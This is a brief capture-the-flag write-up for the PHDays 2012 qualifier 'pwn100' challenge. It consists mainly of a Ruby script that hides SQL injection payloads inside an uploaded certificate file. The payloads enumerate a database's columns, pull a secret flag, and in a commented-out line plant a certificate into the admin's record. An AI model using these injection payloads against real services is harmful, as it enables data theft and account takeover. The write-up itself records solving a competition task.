---
title: PHDays2012 quals - pwn100 writeup
author: zed
categories:
- writeup
---

simple SQL injection

~~~
#!ruby

def upload
  # XXX: get session id from your browser cookies!
  # (or tcpdump :)
  session="dZnITNS/joMp0wM77YcdgGkTNLc=?user_id=TDcxOUwKLg=="
  cmd = 'curl -s -F "key=@ca.tmp;type=application/x-x509-ca-cert" http://ctf.phdays.com:3185/'
  cmd << %Q| -b "session=#{session}"'|
  `#{cmd}`.strip
end

# self generated certificate, required for task
PEM = File.read("ca.crt")

def attack payload
  File.open("ca.tmp","wb") do |f|
    f << PEM
    f << payload
  end
  r = upload
  puts r
end

## to insert my own certificate into admin's:
#pem = PEM.gsub("\n","\\n")
#attack "'),(1,'#{pem}'); /* '"

#attack "'),(719,(SELECT group_concat(column_name) FROM INFORMATION_SCHEMA.columns where                     table_name='secrets')); /* '"

attack "'),(719,(SELECT flag from secrets)); /* '"
~~~

flag: 4478b5f760f9c8ef14d6892b82eebd57

#### related links

 * [Zed's PHDays 2012 files & exploits](https://github.com/zed-0xff/ctf/tree/master/2012.phdays-quals)
